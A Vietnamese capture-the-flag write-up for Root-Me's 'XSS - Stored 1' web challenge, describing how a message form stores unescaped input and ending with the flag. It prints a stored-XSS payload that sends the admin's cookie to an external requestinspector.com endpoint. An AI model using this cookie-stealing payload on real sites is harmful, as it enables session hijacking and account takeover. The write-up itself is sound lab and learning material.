# Write up challenge XSS - Stored 1

Tác giả:
- **Nguyễn Mỹ Quỳnh** <br>

  
[Link Challenge](https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-1)<br>
</br>



<br>


Truy cập challenge ta thấy có một form gửi message.

<img src="./img/1.png" alt="normal_acc_TRAbID"/> 

<br>

<br><br>

Sau nhiều lần điền thử, gửi và refresh lại trang, em nhận thấy sau khi mình gửi message sẽ được lưu lại ở trang này và sau vài phút thì admin sẽ vào đọc tin nhắn.   

<img src="./img/2.png" alt="normal_acc_TRAbID"/>

<img src="./img/3.png" alt="normal_acc_TRAbID"/> 

<br><br>

Tiến hành inspect ta thấy có vẻ input đã không được kiểm tra và được đặt thẳng vào reponse trả về 

<img src="./img/4.png" alt="normal_acc_TRAbID"/> 

<br>

Thử sử dụng phương pháp XSS stored, chèn vào câu lệnh javascript 

<img src="./img/5.png" alt="normal_acc_TRAbID"/> 

<br>

Thật vậy có lỗ hổng!

<img src="./img/6.png" alt="normal_acc_TRAbID"/>

<div style = "page-break-after: always;"></div>

<br>


Những gì cần làm sẽ là lợi dụng lỗ hổng này để chèn đoạn script lưu trữ để khi admin truy cập vào check tin nhắn thì cookie của admin sẽ được gửi đến endpoint mà mình chỉ định.

<br> Sử dụng trang https://requestinspector.com/ để tạo endpoint và check request gửi đến. 
<br>
Tiến hành chèn script:

    <script>document.write("<img src='https://requestinspector.com/inspect/01fyyazm8j1a7pvz6wcx6mqg74?cookie="+document.cookie+"'></img>");</script>

<img src="./img/7.png" alt="normal_acc_TRAbID"/>

Nhận được request chứa cookie của user

<img src="./img/8.png" height='350' alt="normal_acc_TRAbID"/>

<br>

Việc còn lại chỉ cần đợi admin vào đọc message và ta sẽ có được cookie:
<img src="./img/9.png" alt="normal_acc_TRAbID"/>

Submit thành công 

<img src="./img/10.png" height='390' alt="normal_acc_TRAbID"/>

<br><br>

> **Flag:** NkI9qe4cdLIO2P7MIsWS8ofD6

